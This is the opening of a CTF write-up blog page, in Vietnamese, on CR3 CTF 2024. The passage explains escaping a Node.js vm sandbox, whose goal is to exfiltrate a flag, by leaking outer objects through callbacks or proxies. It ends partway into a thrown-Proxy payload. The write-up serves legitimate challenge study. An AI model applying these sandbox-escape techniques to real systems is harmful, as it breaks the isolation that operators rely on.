<!DOCTYPE html>
<html lang="en" dir="ltr" class="scroll-smooth" data-default-appearance="dark"
  data-auto-appearance="true"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  <meta charset="utf-8" />
  
  <meta http-equiv="content-language" content="en" />
  
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
  
  <title>CR3 CTF 2024 &middot; hibwyli</title>
  <meta name="title" content="CR3 CTF 2024 &middot; hibwyli" />
  
  <meta name="description" content="CR3 CTF 2024" />
  <meta name="keywords" content="Web, Reverse, " />
  
  
  <link rel="canonical" href="//localhost:1313/posts/cr3-2024/" />
  
  
  
  
  
  
  
  
  
  
  <link type="text/css" rel="stylesheet" href="/css/main.bundle.min.857ec6700dbdcae3e112eba9fc29e3aa948366934f76d502f60b6a3e436e12e2f10925d27f3032ad87f18cbcaddb981eca1fa59d74de83da90ade26f5faf75dd.css"
    integrity="sha512-hX7GcA29yuPhEuup/CnjqpSDZpNPdtUC9gtqPkNuEuLxCSXSfzAyrYfxjLyt25geyh&#43;lnXTeg9qQreJvX6913Q==" />
  
  
  <script type="text/javascript" src="/js/appearance.min.516a16745bea5a9bd011138d254cc0fd3973cd55ce6e15f3dec763e7c7c2c7448f8fe7b54cca811cb821b0c7e12cd161caace1dd794ac3d34d40937cbcc9ee12.js"
    integrity="sha512-UWoWdFvqWpvQERONJUzA/TlzzVXObhXz3sdj58fCx0SPj&#43;e1TMqBHLghsMfhLNFhyqzh3XlKw9NNQJN8vMnuEg=="></script>
  
  
  
  
  
  
  
  
  
  
  
  <script defer type="text/javascript" id="script-bundle" src="/js/main.bundle.min.984038b35a762692ece6c2038acfa3c9b3eb54655e7bd4838c6ccd3ec0fa375df9477c7a5e2cb6212e4e6847a8b6b8aca64624df0467a3d4d876528de8846064.js"
    integrity="sha512-mEA4s1p2JpLs5sIDis&#43;jybPrVGVee9SDjGzNPsD6N135R3x6Xiy2IS5OaEeotrispkYk3wRno9TYdlKN6IRgZA==" data-copy="" data-copied=""></script>
  
  
  
  <script src="/lib/zoom/zoom.min.37d2094687372da3f7343a221a470f6b8806f7891aa46a5a03966af7f0ebd38b9fe536cb154e6ad28f006d184b294525a7c4054b6bbb4be62d8b453b42db99bd.js" integrity="sha512-N9IJRoc3LaP3NDoiGkcPa4gG94kapGpaA5Zq9/Dr04uf5TbLFU5q0o8AbRhLKUUlp8QFS2u7S&#43;Yti0U7QtuZvQ=="></script>
  
  
  
  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
  <link rel="manifest" href="/site.webmanifest" />
  
  
  
  
  
  
  
  
  <meta property="og:url" content="//localhost:1313/posts/cr3-2024/">
  <meta property="og:site_name" content="hibwyli">
  <meta property="og:title" content="CR3 CTF 2024">
  <meta property="og:description" content="CR3 CTF 2024">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2024-05-03T00:00:00+00:00">
    <meta property="article:modified_time" content="2024-05-03T00:00:00+00:00">
    <meta property="article:tag" content="Web">
    <meta property="article:tag" content="Reverse">
    <meta property="og:image" content="//localhost:1313/posts/cr3-2024/featurecr3.png">

  
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:image" content="//localhost:1313/posts/cr3-2024/featurecr3.png">
  <meta name="twitter:title" content="CR3 CTF 2024">
  <meta name="twitter:description" content="CR3 CTF 2024">

  
  <script type="application/ld+json">
  [{
    "@context": "https://schema.org",
    "@type": "Article",
    "articleSection": "Posts",
    "name": "CR3 CTF 2024",
    "headline": "CR3 CTF 2024",
    "description": "CR3 CTF 2024",
    "abstract": "CR3 CTF 2024",
    "inLanguage": "en",
    "url" : "\/\/localhost:1313\/posts\/cr3-2024\/",
    "author" : {
      "@type": "Person",
      "name": ""
    },
    "copyrightYear": "2024",
    "dateCreated": "2024-05-03T00:00:00\u002b00:00",
    "datePublished": "2024-05-03T00:00:00\u002b00:00",
    
    "dateModified": "2024-05-03T00:00:00\u002b00:00",
    
    "keywords": ["Web","Reverse"],
    
    "mainEntityOfPage": "true",
    "wordCount": "3103"
  }]
  </script>


  
  
  
  
  

<script src="/lib/jquery/jquery.slim.min.7d88d2a1c0c3e9cb6e435406228f7e367f4e73899f6aed88884f0a8b5172315e0e704494b7cd4532a9a1b197bdcd667a83a35d733ac4300a2cd4694b2c08a95a.js" integrity="sha512-fYjSocDD6ctuQ1QGIo9&#43;Nn9Oc4mfau2IiE8Ki1FyMV4OcESUt81FMqmhsZe9zWZ6g6NdczrEMAos1GlLLAipWg=="></script>






















  
  



  
  
  <meta name="theme-color"/>
  
  
</head>
<body
  class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32 scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600">
  <div id="the-top" class="absolute flex self-center">
    <a class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
      href="#main-content"><span
        class="font-bold text-primary-600 ltr:pr-2 rtl:pl-2 dark:text-primary-400">&darr;</span>Skip to main content</a>
  </div>
  
  
  <div style="padding-left:0;padding-right:0;padding-top:2px;padding-bottom:3px"
    class="main-menu flex items-center justify-between px-4 py-6 sm:px-6 md:justify-start space-x-3">
    
    <div class="flex flex-1 items-center justify-between">
        <nav class="flex space-x-3">

            
            <a href="/" class="text-base font-medium text-gray-500 hover:text-gray-900">hibwyli</a>
            

        </nav>
        <nav class="hidden md:flex items-center space-x-5 md:ml-12 h-12">

            
            
            
  <a href="/posts/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
    
    <p class="text-base font-medium" title="Posts">
        Posts
    </p>
</a>



            
            
  <a href="/about/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
    
    <p class="text-base font-medium" title="About">
        About
    </p>
</a>



            
            
  <a href="/categories/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
    
    <p class="text-base font-medium" title="Categories">
        Categories
    </p>
</a>



            
            
  <a href="/tags/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
    
    <p class="text-base font-medium" title="Tags">
        Tags
    </p>
</a>



            
            

            


            
            <button id="search-button" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
                title="">
                

  <span class="relative block icon">
    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>

  </span>


            </button>
            


            
            
            <div
                class="ltr:mr-14 rtl:ml-14 flex items-center">
                <button id="appearance-switcher" aria-label="Dark mode switcher" type="button" class="text-base hover:text-primary-600 dark:hover:text-primary-400">
                    <div class="flex items-center justify-center dark:hidden">
                        

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>

  </span>


                    </div>
                    <div class="items-center justify-center hidden dark:flex">
                        

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>

  </span>


                    </div>
                </button>
            </div>
            

        </nav>
        <div class="flex md:hidden items-center space-x-5 md:ml-12 h-12">

            <span></span>

            


            
            <button id="search-button-mobile" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
                title="">
                

  <span class="relative block icon">
    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>

  </span>


            </button>
            

            
            
            <button id="appearance-switcher-mobile" aria-label="Dark mode switcher" type="button" class="text-base hover:text-primary-600 dark:hover:text-primary-400" style="margin-right:5px">
                <div class="flex items-center justify-center dark:hidden">
                    

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>

  </span>


                </div>
                <div class="items-center justify-center hidden dark:flex">
                    

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>

  </span>


                </div>
            </button>
            

        </div>
    </div>
    <div class="-my-2 -mr-2 md:hidden">

        <label id="menu-button" class="block">
            
            <div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400">
                

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>

  </span>


            </div>
            <div id="menu-wrapper" style="padding-top:5px;"
                class="fixed inset-0 z-30 invisible w-screen h-screen m-0 overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50">
                <ul
                    class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none ltr:text-right rtl:text-left max-w-7xl">

                    <li id="menu-close-button">
                        <span
                            class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400">

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>

  </span>

</span>
                    </li>

                    

                    
  <li class="mt-1">
    <a href="/posts/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
        
        <p class="text-bg font-bg" title="Posts">
            Posts
        </p>
    </a>
</li>




                    

                    
  <li class="mt-1">
    <a href="/about/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
        
        <p class="text-bg font-bg" title="About">
            About
        </p>
    </a>
</li>




                    

                    
  <li class="mt-1">
    <a href="/categories/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
        
        <p class="text-bg font-bg" title="Categories">
            Categories
        </p>
    </a>
</li>




                    

                    
  <li class="mt-1">
    <a href="/tags/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
        
        <p class="text-bg font-bg" title="Tags">
            Tags
        </p>
    </a>
</li>




                    

                </ul>
                
                <hr>
                <ul
                    class="flex mt-4 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none ltr:text-right rtl:text-left max-w-7xl">


                    
                    <li class="mb-1">
                        <a href="/tags/pwnable/"  class="flex items-center">
                            
                            <p class="text-sm font-sm text-gray-500 hover:text-gray-900" title="Pwnable">
                                Pwnable
                            </p>
                        </a>
                    </li>
                    
                    <li class="mb-1">
                        <a href="/tags/web/"  class="flex items-center">
                            
                            <p class="text-sm font-sm text-gray-500 hover:text-gray-900" title="Web">
                                Web
                            </p>
                        </a>
                    </li>
                    
                    <li class="mb-1">
                        <a href=""  class="flex items-center">
                            
                            <span  class="mr-3" >
                                

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>

  </span>


                            </span>
                            
                            <p class="text-sm font-sm text-gray-500 hover:text-gray-900" title="">
                                Write up
                            </p>
                        </a>
                    </li>
                    

                </ul>
                
                

            </div>
        </label>
    </div>
</div>


<div class="main-menu flex pb-3 flex-col items-end justify-between md:justify-start space-x-3" >
    <div class="hidden md:flex items-center space-x-5">
        
        <a href="/tags/pwnable/"  class="flex items-center">
            
            <p class="text-xs font-light text-gray-500 hover:text-gray-900" title="Pwnable">
                Pwnable
            </p>
        </a>
        
        <a href="/tags/web/"  class="flex items-center">
            
            <p class="text-xs font-light text-gray-500 hover:text-gray-900" title="Web">
                Web
            </p>
        </a>
        
        <a href=""  class="flex items-center">
            
            <span  class="mr-1" >
                

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>

  </span>


            </span>
            
            <p class="text-xs font-light text-gray-500 hover:text-gray-900" title="">
                Write up
            </p>
        </a>
        
    </div>
</div>




  
  <div class="relative flex flex-col grow">
    <main id="main-content" class="grow">
      


<article>
  
  
  
  
  
  


<div id="hero" class="h-[150px] md:h-[200px]"></div>



    
    <div class="fixed inset-x-0 top-0 h-[800px] single_hero_background nozoom"
    style="background-image:url(/posts/cr3-2024/featurecr3.png);">
    


    <div class="absolute inset-0 bg-gradient-to-t from-neutral dark:from-neutral-800 to-transparent mix-blend-normal">
    </div>
    <div
        class="absolute inset-0 opacity-60 bg-gradient-to-t from-neutral dark:from-neutral-800 to-neutral-100 dark:to-neutral-800 mix-blend-normal">
    </div>
</div>

<div id="background-blur" class="fixed opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-2xl"></div>
<script>
    window.addEventListener('scroll', function (e) {
        var scroll = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop || 0;
        var background_blur = document.getElementById('background-blur');
        background_blur.style.opacity = (scroll / 300)
    });
</script>

  
  

  <header id="single_header" class="mt-5 max-w-prose">
    
    <ol class="text-sm text-neutral-500 dark:text-neutral-400 print:hidden">
  
  
    
  
    
  
  <li class="inline hidden">
    <a
      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
      href="/"
      >hibwyli</a
    ><span class="px-1 text-primary-500">/</span>
  </li>

  
  <li class="inline ">
    <a
      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
      href="/posts/"
      >Posts</a
    ><span class="px-1 text-primary-500">/</span>
  </li>

  
  <li class="inline hidden">
    <a
      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
      href="/posts/cr3-2024/"
      >CR3 CTF 2024</a
    ><span class="px-1 text-primary-500">/</span>
  </li>

</ol>


    
    <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
      CR3 CTF 2024
    </h1>
    <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
      





  
  







  







  













<div class="flex flex-row flex-wrap items-center">
  
  
  <time datetime="2024-05-03T00:00:00&#43;00:00">3 May 2024</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">15 mins</span>
  

  
  
</div>


<div class="flex flex-row flex-wrap items-center">
  
  
  
  
     <div style="cursor: pointer;" onclick="window.open(&#34;/authors/shin24/&#34;,'_self');return false;">Shin24</div>
  
  
  
  
  
  
  
  
  
  
</div>




<div class="flex flex-row flex-wrap items-center">
  
  
  
  
  
  
  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/categories/writeup/&#34;,'_self');return false;">
    <span class="flex" style="cursor: pointer;">
  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Writeup
  </span>
</span>
  </span>
  
  
  
  
  
  
  
  
  
  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/web/&#34;,'_self');return false;">
    <span class="flex" style="cursor: pointer;">
  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Web
  </span>
</span>
  </span>
  
  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/reverse/&#34;,'_self');return false;">
    <span class="flex" style="cursor: pointer;">
  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Reverse
  </span>
</span>
  </span>
  
  
  
  
</div>




    </div>

    
    
    
    
    

    

    
      
      
        
        
<div class="flex author">
  
  <div class="place-self-center">
    
    
    <div class="text-2xl sm:text-lg">
</div>
  </div>
</div>

      

      
        

      
      <div class="mb-5"></div>
      

    

  </header>
  
  <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
    
     <div
      class="order-first lg:ml-auto px-0 lg:order-last ltr:lg:pl-8 rtl:lg:pr-8">
      <div class="toc ltr:pl-5 rtl:pr-5 print:hidden lg:sticky lg:top-10">

         <details open id="TOCView"
  class="toc-right mt-0 overflow-y-scroll overscroll-contain scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600 rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 hidden lg:block">
  <summary
    class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
    Table of Contents
  </summary>
  <div
    class="min-w-[220px] py-2 border-dotted ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
    <nav id="TableOfContents">
  <ul>
    <li><a href="#jscripting">Jscripting</a></li>
    <li><a href="#jscripting-revenge">Jscripting-revenge</a>
      <ul>
        <li><a href="#reversing-v8-bytecode">Reversing V8 bytecode</a></li>
        <li><a href="#unintendeds">Unintendeds</a></li>
      </ul>
    </li>
  </ul>
</nav>
  </div>
</details>
<details class="toc-inside mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 lg:hidden">
  <summary
    class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
    Table of Contents
  </summary>
  <div
    class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
    <nav id="TableOfContents">
  <ul>
    <li><a href="#jscripting">Jscripting</a></li>
    <li><a href="#jscripting-revenge">Jscripting-revenge</a>
      <ul>
        <li><a href="#reversing-v8-bytecode">Reversing V8 bytecode</a></li>
        <li><a href="#unintendeds">Unintendeds</a></li>
      </ul>
    </li>
  </ul>
</nav>
  </div>
</details>

<script>

  var margin = 200;
  var marginError = 50;

  (function () {
    var $window = $(window);
    var $toc = $('#TOCView');
    var tocHeight = $toc.height();

    function onResize() {
      var windowAndMarginHeight = $window.height() - margin;
      if(tocHeight >= windowAndMarginHeight) {
        $toc.css("overflow-y", "scroll")
        $toc.css("max-height", (windowAndMarginHeight + marginError) + "px")
      } else {
        $toc.css("overflow-y", "hidden")
        $toc.css("max-height", "9999999px")
      }
    }

    $window.on('resize', onResize);
    $(document).ready(onResize);
  })();



</script>
   </div>
      </div>
      

      <div class="min-w-0 min-h-0 max-w-fit">
        
        


        <div class="article-content max-w-prose mb-20">
          <p>Tối hôm trước mình có làm vài bài bên CR3 CTF để warmup cho Hacktheon 2024 vào thứ 7, sau đây là writeup của mình cho 2 bài <code>jscripting</code> và <code>jscripting-revenge</code></p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/CP04042K/cp04042k.github.io/assets/35491855/3e7c5b74-9ef1-4a96-9e07-07dd01ac4fca" alt="image" />
    
  </figure>
</p>


<h2 class="relative group">Jscripting 
    <div id="jscripting" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#jscripting" aria-label="Anchor">#</a>
    </span>        
    
</h2>
<p>Có thể nói đây là một nodejs sandbox dùng worker thread để chạy external code, dùng một custom <code>require</code> function chỉ cho phép gọi đến một danh sách các module giới hạn, mục tiêu sẽ là exfiltrate được flag hay secret gì đó. Module <code>vm</code> của nodejs được chọn để chạy external code, tuy nhiên module này không được tạo ra với mục đích bảo mật, đây chỉ là module giúp lập trình viên run code trong một context khác để tránh xung đột và ảnh hưởng đến các object ở context chính. Để escape ra <code>vm</code> thì việc thường làm sẽ là tìm cách leak các object từ bên ngoài thông qua các callback hoặc proxy</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="p">(()</span> <span class="p">=&gt;</span> <span class="p">{</span> <span class="k">throw</span> <span class="k">new</span> <span class="nb">Proxy</span><span class="p">({},</span> <span class="p">{</span>
